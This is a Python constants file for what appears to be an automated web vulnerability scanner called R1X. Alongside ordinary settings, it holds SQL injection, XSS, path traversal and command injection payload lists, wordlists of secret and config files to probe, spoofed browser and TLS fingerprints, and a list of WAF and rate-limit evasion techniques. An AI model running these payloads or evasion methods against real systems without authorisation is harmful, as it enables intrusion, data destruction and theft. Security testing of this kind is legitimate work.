"""
R1X Platform - Constants & Configuration
Autonomous Cyber Intelligence Platform
Version: 2.0.0
"""

from enum import Enum
from typing import Dict, List, Final


# ═══════════════════════════════════════════════════════════════════════════════
# VERSION INFO
# ═══════════════════════════════════════════════════════════════════════════════

VERSION: Final[str] = "2.0.0"
PLATFORM_NAME: Final[str] = "R1X"
PLATFORM_FULL_NAME: Final[str] = "R1X Cyber Intelligence Platform"
AUTHOR: Final[str] = "R1X Development Team"


# ═══════════════════════════════════════════════════════════════════════════════
# TIMEOUTS & LIMITS
# ═══════════════════════════════════════════════════════════════════════════════

class Timeouts:
    """Timeout configurations in seconds"""
    CONNECTION: Final[float] = 5.0
    READ: Final[float] = 10.0
    TOTAL: Final[float] = 30.0
    DNS_CACHE: Final[int] = 300
    WAF_COOLDOWN: Final[int] = 300
    RATE_LIMIT_BACKOFF: Final[int] = 60


class Limits:
    """System limits"""
    MAX_CONCURRENT_REQUESTS: Final[int] = 100
    MAX_CONCURRENT_PER_HOST: Final[int] = 20
    MAX_RETRIES: Final[int] = 5
    MAX_REDIRECTS: Final[int] = 5
    MAX_PAYLOAD_SIZE: Final[int] = 1048576  # 1MB
    MAX_FILE_ENUMERATION: Final[int] = 5000
    MAX_ENDPOINT_DISCOVERY: Final[int] = 10000
    CONCURRENCY_MIN: Final[int] = 1
    CONCURRENCY_MAX: Final[int] = 100
    CONCURRENCY_DEFAULT: Final[int] = 50


# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILITY CATEGORIES (OWASP-based)
# ═══════════════════════════════════════════════════════════════════════════════

class VulnCategory(Enum):
    """Vulnerability categories"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    IDOR = "idor"
    BROKEN_AUTH = "broken_auth"
    MISCONFIGURATION = "misconfiguration"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data"
    CRYPTO_FAILURE = "crypto_failure"
    INSECURE_DESERIALIZATION = "deserialization"
    XXE = "xxe"
    SECURITY_MISCONFIGURATION = "security_misconfig"
    BROKEN_ACCESS_CONTROL = "access_control"


class Severity(Enum):
    """Vulnerability severity levels"""
    CRITICAL = ("critical", 10)
    HIGH = ("high", 7.5)
    MEDIUM = ("medium", 5)
    LOW = ("low", 2.5)
    INFO = ("info", 0)

    def __init__(self, label: str, score: float):
        self.label = label
        self.score = score

    def __str__(self) -> str:
        return self.label


# ═══════════════════════════════════════════════════════════════════════════════
# SCAN TYPES
# ═══════════════════════════════════════════════════════════════════════════════

class ScanType(Enum):
    """Types of scans available"""
    FULL_SCAN = "full_scan"
    QUICK_SCAN = "quick_scan"
    DEEP_SCAN = "deep_scan"
    RECON = "reconnaissance"
    VULN_SCAN = "vulnerability_scan"
    ENUMERATION = "enumeration"
    FINGERPRINT = "fingerprinting"
    BYPASS = "bypass_attempt"


class ScanStatus(Enum):
    """Scan execution status"""
    PENDING = "pending"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


# ═══════════════════════════════════════════════════════════════════════════════
# WAF TYPES & DETECTION SIGNATURES
# ═══════════════════════════════════════════════════════════════════════════════

class WAFType(Enum):
    """Known WAF types"""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    INCAPSULA = "incapsula"
    IMPERVA = "imperva"
    F5_BIGIP = "f5_bigip"
    AWS_WAF = "aws_waf"
    AZURE_WAF = "azure_waf"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    SQUARECLOUD = "squarecloud"
    UNKNOWN = "unknown"


class BlockType(Enum):
    """Types of blocks encountered"""
    WAF_BLOCK = "waf_block"
    RATE_LIMIT = "rate_limit"
    CAPTCHA = "captcha"
    IP_BLOCK = "ip_block"
    GEO_BLOCK = "geo_block"
    AUTH_REQUIRED = "auth_required"
    EMPTY_RESPONSE = "empty_response"
    TIMEOUT = "timeout"
    CONNECTION_RESET = "connection_reset"
    FORBIDDEN = "forbidden"
    NONE = "none"


# ═══════════════════════════════════════════════════════════════════════════════
# USER AGENTS (Rotating)
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS: Final[List[str]] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


# ═══════════════════════════════════════════════════════════════════════════════
# JA3 FINGERPRINTS (TLS Fingerprinting)
# ═══════════════════════════════════════════════════════════════════════════════

JA3_PROFILES: Final[List[str]] = [
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-45-28-21-43-51,29-23-24-25-256-257,0",
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-45-28-21-43-51,29-23-24-25,0",
    "771,4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-45-28-21-43-51,29-23-24-25-256-257-258-259,0",
]


# ═══════════════════════════════════════════════════════════════════════════════
# COMMON FILES FOR ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════

COMMON_FILES: Final[List[str]] = [
    # Configuration files
    ".env", ".env.backup", ".env.local", ".env.production",
    "config.php", "config.yaml", "config.json", "config.xml",
    "wp-config.php", "configuration.php", "settings.py",
    ".htaccess", ".htpasswd", "web.config", "nginx.conf",
    "database.sql", "dump.sql", "backup.sql", "data.sql",
    "docker-compose.yml", "Dockerfile", ".dockerignore",
    "package.json", "package-lock.json", "composer.json",

    # Git/Version Control
    ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
    ".gitignore", ".gitattributes",

    # Admin/Login pages
    "admin/", "administrator/", "admin/login.php", "wp-login.php",
    "login.php", "login.html", "dashboard/", "cp/", "control/",
    "panel/", "manage/", "management/", "backoffice/",

    # Backup files
    "backup.zip", "backup.tar", "backup.tar.gz", "backup.rar",
    "old/", "bak/", "backup/", "archive/", "dump/",

    # Debug & Info
    "debug.log", "error.log", "info.php", "phpinfo.php",
    "test.php", "debug.php", "status.php", "health.php",
    "info.html", "server-status", "server-info",

    # API & Documentation
    "api/", "api/v1/", "api/v2/", "api-docs/", "swagger/",
    "graphql", "graphiql", "docs/", "documentation/",
    "readme.md", "README.md", "CHANGELOG.md", "LICENSE.md",

    # CMS specific
    "wp-admin/", "wp-login.php", "xmlrpc.php", "wp-content/",
    "joomla/", "drupal/", "magento/", "wordpress/",
    "cms/", "sitecore/", "typo3/",

    # Sensitive directories
    "tmp/", "temp/", "cache/", "uploads/", "files/",
    "images/", "media/", "static/", "assets/",
    "test/", "dev/", "staging/", "beta/",

    # JS/Config files
    ".well-known/", "credentials.json", "secrets.json",
    "api_key.json", "service-account.json",
]


# ═══════════════════════════════════════════════════════════════════════════════
# COMMON ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

COMMON_ENDPOINTS: Final[List[str]] = [
    "/", "/index.html", "/index.php", "/home", "/default",
    "/about", "/about-us", "/contact", "/contact-us",
    "/api", "/api/", "/api/users", "/api/products", "/api/login",
    "/api/v1/", "/api/v2/", "/rest/", "/graphql",
    "/admin", "/admin/", "/admin/login", "/dashboard",
    "/user", "/users", "/profile", "/account",
    "/search", "/products", "/services", "/pricing",
    "/blog", "/news", "/faq", "/help",
    "/cart", "/checkout", "/payment", "/orders",
    "/settings", "/options", "/preferences",
    "/upload", "/download", "/file", "/downloads",
    "/ws/", "/socket.io/", "/sockets/",
    "/health", "/status", "/ping", "/alive",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/.well-known/security.txt", "/.well-known/ai.json",
]


# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOAD LISTS FOR TESTING
# ═══════════════════════════════════════════════════════════════════════════════

SQL_INJECTION_PAYLOADS: Final[List[str]] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",
    "1' AND 1=1--",
    "' OR 1=1 LIMIT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' UNION SELECT version()--",
    "1' AND SLEEP(5)--",
]

XSS_PAYLOADS: Final[List[str]] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
]

PATH_TRAVERSAL_PAYLOADS: Final[List[str]] = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

COMMAND_INJECTION_PAYLOADS: Final[List[str]] = [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(whoami)",
    "|| whoami",
    "& whoami &",
    "%0a whoami",
]


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP HEADERS
# ═══════════════════════════════════════════════════════════════════════════════

DEFAULT_HEADERS: Final[Dict[str, str]] = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "no-cache",
}


# ═══════════════════════════════════════════════════════════════════════════════
# LOG LEVELS
# ═══════════════════════════════════════════════════════════════════════════════

class LogLevel(Enum):
    """Logging levels"""
    TRACE = "TRACE"
    DEBUG = "DEBUG"
    INFO = "INFO"
    SUCCESS = "SUCCESS"
    WARNING = "WARNING"
    ERROR = "ERROR"
    CRITICAL = "CRITICAL"


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════════

REPORT_FORMATS: Final[List[str]] = ["json", "html", "pdf", "markdown", "csv"]


# ═══════════════════════════════════════════════════════════════════════════════
# PROXY CONFIGURATIONS
# ═══════════════════════════════════════════════════════════════════════════════════════

PROXY_PROTOCOLS: Final[List[str]] = ["http", "https", "socks4", "socks5"]


# ═══════════════════════════════════════════════════════════════════════════════
# BYPASS TECHNIQUES
# ═══════════════════════════════════════════════════════════════════════════════

BYPASS_TECHNIQUES: Final[Dict[str, List[str]]] = {
    "header_rotation": [
        "Rotate User-Agent",
        "Randomize header order",
        "Add X-Forwarded-For with sequential IPs",
        "Add X-Real-IP",
        "Add X-Forwarded-Proto",
        "Add Via header"
    ],
    "protocol_obfuscation": [
        "HTTP/1.0 downgrade",
        "Remove modern headers",
        "Basic Auth injection",
        "Chunked transfer encoding",
        "HTTP/2 multiplexing"
    ],
    "timing_attack": [
        "Exponential backoff with jitter",
        "Random delays (5-15 seconds)",
        "Burst-then-pause pattern",
        "Human-like timing variance",
        "Extended time window"
    ],
    "encoding_evasion": [
        "Double URL encoding",
        "Unicode normalization",
        "Mixed case hex encoding",
        "Null byte injection",
        "Base64 with custom alphabet"
    ],
    "fragmentation": [
        "Split payload into chunks",
        "Different Content-Length per chunk",
        "Incremental payload delivery",
        "Randomized padding",
        "Chunked encoding"
    ],
    "proxy_rotation": [
        "Rotate proxy pool",
        "Residential proxy endpoints",
        "IP cooling period",
        "Distributed subnets",
        "ASN rotation"
    ]
}
